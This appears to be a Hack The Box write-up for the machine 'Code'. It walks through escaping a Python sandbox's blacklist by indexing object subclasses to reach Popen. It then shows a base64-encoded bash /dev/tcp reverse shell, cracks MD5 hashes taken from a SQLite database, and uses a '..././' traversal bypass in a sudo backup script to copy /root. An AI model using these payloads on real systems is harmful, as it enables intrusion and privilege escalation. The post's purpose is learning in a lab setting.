---
layout: post
title: "HTB-Code"
---
<p id="hidden"></p>
In Code, we  exploited a Python sandbox to execute code, got a reverse shell, retrieved SSH credentials from the database, and bypassed a backup filter to grab the root flag.


<h2>Introduction</h2>

<p>In this post, I will demonstrate the exploitation of an easy machine called "Cap" on hack the box. Overall, it was quite a hard box for me as I have little experience with python. It was a good learning experience.</p>

<h2> Step 1: running an Nmap scan on the target</h2>

<p>As always, we start with an Nmap scan on the target. I like to use the options -sC and -sV to run some Nmap scripts and do service detection, respectively. This allows us to capture a lot of information as a starting point.</p>
<p>We get the following output:</p>
<pre>
‚îå‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ nmap -sV -sC -p- 10.10.11.62
Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-15 08:14 EDT
Stats: 0:00:14 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 50.00% done; ETC: 08:15 (0:00:06 remaining)
Nmap scan report for 10.10.11.62
Host is up (0.0097s latency).
Not shown: 65533 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b5:b9:7c:c4:50:32:95:bc:c2:65:17:df:51:a2:7a:bd (RSA)
|   256 94:b5:25:54:9b:68:af:be:40:e1:1d:a8:6b:85:0d:01 (ECDSA)
|_  256 12:8c:dc:97:ad:86:00:b4:88:e2:29:cf:69:b5:65:96 (ED25519)
5000/tcp open  http    Gunicorn 20.0.4
|_http-title: Python Code Editor
|_http-server-header: gunicorn/20.0.4
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.57 seconds
</pre>
<p>With our nmap scan, we find an active ssh service as well as a Gunicorn  web server  hosted on port 5000.</p>

<h2>Step 2: Enumerating the website</h2>
<p>Visiting the website, we find a python sandbox which can be used to test and execute python code. Additionally, we have the option to register and login to the page.</p>
<img src="/images/Code/code_python_jail.webp" alt="python sandbox" class="postImage">

<p>First; I started by registering an account on the page and logging in with this newly made account. This did not seem all that interesting as the only thing it allowed us to do was save some code to be used later. However, it hints that a database is being used to save user information. This could be crucial during privilege escalation.</p>

<h2>Gaining access</h2>

<p>Next, i tried some basic python syntax to gain code execution. A list of things to try to gain code execution can be find at this source: <span class="url"><a href="https://hacktricks.boitatech.com.br/misc/basic-python/bypass-python-sandboxes">Hacktricks python sandbox escape.</a></span>. Unfortenately, this did not work. The interpreter kept returning that some keywords were not allowed. Therefore, it seems that there is some kind of blacklist involving the following keywords: "os, system, command, subprocess, import, __import__, ..."</p>

<p>Next, I checked what subclasses where already loaded into memory using the following python syntax (this is also mentioned in the above source):</p>
<pre>
print([].__class__.__base__.__subclasses__())
</pre>

<p>Doing this, we found that the class subprocess. Popen is already loaded in memory. Popen is a class which allows to perform system commands. Why did we check whether a module is already loaded in memory? As import is being blacklisted, we cant import modules like os or System and so on. Now, we know that Popen is already imported and could allow for code execution. So, let's try it!</p>

<pre>
subprocess.Popen(["/bin/sh", "-c", "id"])
Popen(["/bin/sh", "-c", "id"])
</pre>

<p>Unfortunately, the above syntax did not work. It seems that both keywords "subprocess" and "Popen" are blacklisted and therefore not executed. So, how do we execute Popen without using its name? Apparently, this can be bypassed by doing the following:</p>

<pre>
i=0
for c in [].__class__.__base__.__subclasses__():
    print(str(i) + c.__name__)
    i+=1
</pre>

<p>What does this actually do? this part "[].__class__.__base__.__subclasses__()" returns a list of all subclasses of object. In case you did not know, all subclasses have the superclass (directly or indirectly) object. The variable "c" contains "class &lt;name of the class&gt;. In the loop, we print the index of the class in our array (only its name, thus essentially removing "class"). This way, we can determine what index our subprocess.Popen has in our array. Let's fine tune this a bit:</p>
<pre>
i = 0
for c in [].__class__.__base__.__subclasses__():
    if ("Po" + "pen" == c.__name__):
        print(f"{i} {c.__name__}")
    i += 1
</pre>

<p>This piece of code does the exact same thing with a small extention. It only returns the index of the process which we are looking for ("Popen"). Note that "Popen" is splitted in "Po" "pen" as the full word is blacklisted.</p>

<p>Apparently, it is possible to execute this module using the following syntax:</p>

<pre>
[].__class__.__base__.__subclasses__()[317](['ping', 'IPAdress'])
</pre>

<p>How does this work? As previously said, the first part return a list of all the subclasses that are loaded in the environment. We address the Popen class by its index and pass arguments through it using (['ping', 'IPAdress']). This is basically identical to subprocess. Popen(['ping', 'IPAddress']). This however, cannot be used do to the blacklisting. therefore the method using the index is a nice trick to achieve the same without mentioning any classnames. Let's see if our ping worked:</p>

<pre>
sudo tcpdump icmp -i tun0                                                                                                                                                           
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:54:03.038369 IP 10.10.11.62 > 10.10.14.47: ICMP echo request, id 1, seq 170, length 64
09:54:03.038380 IP 10.10.14.47 > 10.10.11.62: ICMP echo reply, id 1, seq 170, length 64
09:54:03.362923 IP 10.10.11.62 > 10.10.14.47: ICMP echo request, id 3, seq 86, length 64
09:54:03.362935 IP 10.10.14.47 > 10.10.11.62: ICMP echo reply, id 3, seq 86, length 64
09:54:03.390631 IP 10.10.11.62 > 10.10.14.47: ICMP echo request, id 2, seq 161, length 64
09:54:03.390642 IP 10.10.14.47 > 10.10.11.62: ICMP echo reply, id 2, seq 161, length 64
09:54:04.041602 IP 10.10.11.62 > 10.10.14.47: ICMP echo request, id 1, seq 171, length 64
09:54:04.041615 IP 10.10.14.47 > 10.10.11.62: ICMP echo reply, id 1, seq 171, length 64
</pre>

<p>YES, we have code execution, We get a lot of pings on our machine. I probably should have specified to ping only once because now it will keep pinging our machine indefinitely. But that's not really an issue here.</p>

<p>Now, it is time to craft our payload for a reverse shell. For this, I tried the following payload:</p>

<pre>
bash -i >& /dev/tcp/10.0.0.1/9000 0>&1
</pre>

<p>This, however, did not work. It is probably because the special characters are misinterpreted. This can be fixed by encoding our payload in base64 and then decoding it. First let's encode it:</p>

<pre>
echo -n 'bash  -i >& /dev/tcp/10.0.0.1/9000  0>&1  ' | base64
YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvOTAwMCAgMD4mMSAg
</pre>
<p>Note that I played a bit with spaces to make sure there are no special characters in my base64 payload.</p>
<p>Don't forget to set a netcat listener:</p>
<pre>
nc -lnvp 5000
</pre>
<p>In the Python environment, I used the following payload:</p>
<pre>
[].__class__.__base__.__subclasses__()[317](['bash', '-c', 'echo "YmFzaCAgLWkgPiYgL2Rldi90Y3AvMTAuMC4wLjEvOTAwMCAgMD4mMSAg" | base64 -d | bash'])
</pre>
<p>Explanation: bash get executed with the "-c" flag which allows commands to be executed from the string that follows. The b64 string is being decoded and passed to bash. This allows us to circumvent the use of special characters directly in the shell (they are bing passed as a string decoded form out b64).</p>

<p>Going back to our netcat listener, we received a shell where we can find the user.txt flag.</p>

<pre>
app-production@code:~/app$ cd ..
cd ..
app-production@code:~$ ls
ls
app
user.txt
app-production@code:~$ cat user.txt
</pre>

<h2>Privilege Escalation - Gaining root</h2>

<p>Exploring the machine a bit further, I find a app.py script which mentions a database being used. As said in the beginning of this walkthrough, this could be interesting to extract user credentials:</p>

<pre>
cat app.py
from flask import Flask, render_template,render_template_string, request, jsonify, redirect, url_for, session, flash
from flask_sqlalchemy import SQLAlchemy
import sys
import io
import os
import hashlib

app = Flask(__name__)
app.config['SECRET_KEY'] = "7j4D5htxLHUiffsjLXB1z9GaZ5"
app.config['SQLALCHEMY_DATABASE_URI'] = 'sqlite:///database.db'
app.config['SQLALCHEMY_TRACK_MODIFICATIONS'] = False
db = SQLAlchemy(app)
</pre>

<p>Next, I exported this database file to my local kali machine and examined it using sqlite3:</p>
<pre>
‚îî‚îÄ$ sqlite3
SQLite version 3.46.1 2024-08-13 09:16:08
Enter ".help" for usage hints.
Connected to a transient in-memory database.
Use ".open FILENAME" to reopen on a persistent database.
sqlite> .open database.db
sqlite> select * from user;
1|development|759b74ce43947f5f4c91aeddc3e5bad3
2|martin|3de6f30c4a09c27fc71932bfc68474be
</pre>

<p>These seem like md5 hashes as they are 32 characters long. So, let's try cracking them using crackstation. We find the following password for martin (martin is a user on the box):</p>

<img src="/images/Code/code_crackstation.webp" alt="cracked password for martin" class="postImage">

<p>Let's log in as martin using ssh:</p>
<pre>
‚îÄ‚îÄ(kali„âøkali)-[~]
‚îî‚îÄ$ ssh martin@10.10.11.62
The authenticity of host '10.10.11.62 (10.10.11.62)' can't be established.
ED25519 key fingerprint is SHA256:AlQsgTPYThQYa3z9ZAHkFiO/LqXA6T55FoT58A1zlAY.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes$
Please type 'yes', 'no' or the fingerprint: yes 
Warning: Permanently added '10.10.11.62' (ED25519) to the list of known hosts.
martin@10.10.11.62's password: 
Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-208-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/pro

 System information as of Fri 15 Aug 2025 02:37:39 PM UTC

  System load:           0.0
  Usage of /:            54.3% of 5.33GB
  Memory usage:          18%
  Swap usage:            0%
  Processes:             232
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.62
  IPv6 address for eth0: dead:beef::250:56ff:fe94:50ce


Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


                                                                                                                                                                                         
The programs included with the Ubuntu system are free software;                                                                                                                          
the exact distribution terms for each program are described in the                                                                                                                       
individual files in /usr/share/doc/*/copyright.                                                                                                                                          

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Fri Aug 15 14:37:39 2025 from 10.10.14.47
martin@code:~$
</pre>

<p>In martin's home directory, we find an interesting json file:</p>
<pre>
{
    "destination": "/home/martin/backups/",
    "multiprocessing": true,
    "verbose_log": false,
    "directories_to_archive": [
        "/home/app-production/app"
    ],
    "exclude": [
        ".*"
    ]
}
</pre>
<p>Next, I investigated whether we can run anything as sudo:</p>
<pre>
sudo -l
User martin may run the following commands on localhost:
    (ALL : ALL) NOPASSWD: /usr/bin/backy.sh
</pre>
<p>It seems we can run /usr/bin/backy.sh without a sudo password. Initial examination of the backy.sh script revealed that it needed a json file as argument which is probably the above mentioned json file. Investigating the script a bit further revealed that it's function is to perform a backup of certain directories. Unfortunately, There are a few caveats. We can only backup directories starting from /home and /var. There also seems to be some code that prevents path traversal. This is annoying as we want to make a backup of the /root directory and access the root.txt or/and ssh keys. Making the connection to the json file, it seems that "destination" is the output location for the backup and "directories_to_archive" is an array containing the directories that need to be present in the backup.</p>
<pre>
cat /usr/bin/backy.sh
#!/bin/bash

if [[ $# -ne 1 ]]; then
    /usr/bin/echo "Usage: $0 &lt;task.json&gt;"
    exit 1
fi

json_file="$1"

if [[ ! -f "$json_file" ]]; then
    /usr/bin/echo "Error: File '$json_file' not found."
    exit 1
fi

allowed_paths=("/var/" "/home/") #only allows backups from /var and /home

updated_json=$(/usr/bin/jq '.directories_to_archive |= map(gsub("\\.\\./"; ""))' "$json_file") #code preventing directory traversal

/usr/bin/echo "$updated_json" > "$json_file"

directories_to_archive=$(/usr/bin/echo "$updated_json" | /usr/bin/jq -r '.directories_to_archive[]')

is_allowed_path() {
    local path="$1"
    for allowed_path in "${allowed_paths[@]}"; do
        if [[ "$path" == $allowed_path* ]]; then
            return 0
        fi
    done
    return 1
}

for dir in $directories_to_archive; do
    if ! is_allowed_path "$dir"; then
        /usr/bin/echo "Error: $dir is not allowed. Only directories under /var/ and /home/ are allowed."
        exit 1
    fi
done

/usr/bin/backy "$json_file"
</pre>

<p>Examining the code preventing directory traversal, we can see that it is not very secure. It searches for "../" in the path and replaces it with "" (see gsub function). Therefore, we can replace "../" by "..././ as this becomes "../" after sanitation. Thus, if we type the this in our json file, we can bypass this and do a directory traversal backing up the root directory:</p>
<pre>
{
    "destination": "/home/martin/backups/",
    "multiprocessing": true,
    "verbose_log": false,
    "directories_to_archive": [
        "/home/..././..././..././root"
    ],
    "exclude": [
    ]
}
</pre>
<p>Note, I also removed to exclude argument as we want to backup everything (also hidden files like ssh keys for example).</p>

<p>Running the script with sudo privileges resulted in a successful backup of the root directory:</p>
<pre>
2martin@code:~$ sudo /usr/bin/backy.sh test.json 
2025/08/15 15:17:53 üçÄ backy 1.2
2025/08/15 15:17:53 üìã Working with test.json ...
2025/08/15 15:17:53 üí§ Nothing to sync
2025/08/15 15:17:53 üì§ Archiving: [/home/../../../root /home/user/martin]
2025/08/15 15:17:53 üì• To: /home/martin ...
2025/08/15 15:17:53 üì¶
2025/08/15 15:17:53 üì¶ üì¶
</pre>

<p>Extracting the backup provides us with the root directory where we can find the root.txt flag as well as the ssh keys for the root user:</p>

<pre>
tar xvjf backupfile.tar.bz2
martin@code:~$ cd root
martin@code:~/root$ ls
root.txt  scripts
</pre>
<p>Note: x stands for extract, v for verbose, j for bz2, f for file.</p>
<p>Congratulations, you have successfully rooted this box!</p>
<h2>Final thoughts</h2>
<p>In general, this was a fun but hard box for me as I have little experience with python (my main programming language is Java). Therefore, I need to admit that I have had a little bit of help gaining an initial foothold of the machine. However, I made sure to understand every step that i did. I learned a lot doing this box.</p>
<a href="/">Go to the Home Page</a>



